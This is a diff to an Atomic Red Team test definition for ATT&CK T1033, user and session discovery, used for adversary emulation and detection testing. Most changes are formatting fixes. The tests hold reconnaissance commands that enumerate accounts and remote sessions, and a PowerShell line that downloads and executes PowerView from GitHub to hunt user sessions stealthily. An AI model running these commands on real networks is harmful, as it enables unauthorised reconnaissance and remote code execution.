@@ -1,7 +1,5 @@
----
 attack_technique: T1033
 display_name: System Owner/User Discovery
-
 atomic_tests:
 - name: System Owner/User Discovery
   auto_generated_guid: 4c4959bf-addf-4b4a-be86-8d09cc1857aa
@@ -10,56 +8,46 @@ atomic_tests:
 
     Upon successful execution, cmd.exe will spawn multiple commands against a target host to identify usernames. Output will be via stdout. 
     Additionally, two files will be written to disk - computers.txt and usernames.txt.
-
   supported_platforms:
-    - windows
-
+  - windows
   input_arguments:
     computer_name:
       description: Name of remote computer
       type: string
       default: localhost
-
   executor:
-    name: command_prompt
-    elevation_required: false
     command: |
       cmd.exe /C whoami
       wmic useraccount get /ALL
       quser /SERVER:"#{computer_name}"
       quser
-      qwinsta.exe" /server:#{computer_name}
+      qwinsta.exe /server:#{computer_name}
       qwinsta.exe
       for /F "tokens=1,2" %i in ('qwinsta /server:#{computer_name} ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
       @FOR /F %n in (computers.txt) DO @FOR /F "tokens=1,2" %i in ('qwinsta /server:%n ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
-
+    name: command_prompt
 - name: System Owner/User Discovery
   auto_generated_guid: 2a9b677d-a230-44f4-ad86-782df1ef108c
   description: |
     Identify System owner or users on an endpoint
 
     Upon successful execution, sh will stdout list of usernames.
-
   supported_platforms:
-    - linux
-    - macos
-
+  - linux
+  - macos
   executor:
-    name: sh
-    elevation_required: false
     command: |
       users
       w
       who
-
+    name: sh
 - name: Find computers where user has session - Stealth mode (PowerView)
   auto_generated_guid: 29857f27-a36f-4f7e-8084-4557cd6207ca
-  description:
-    Find existing user session on other computers. Upon execution, information about any sessions discovered will be displayed.
+  description: Find existing user session on other computers. Upon execution, information about any sessions discovered will be displayed.
   supported_platforms:
-    - windows
+  - windows
   executor:
-    name: powershell
-    elevation_required: false
     command: |
       IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); Invoke-UserHunter -Stealth -Verbose
+    name: powershell
+
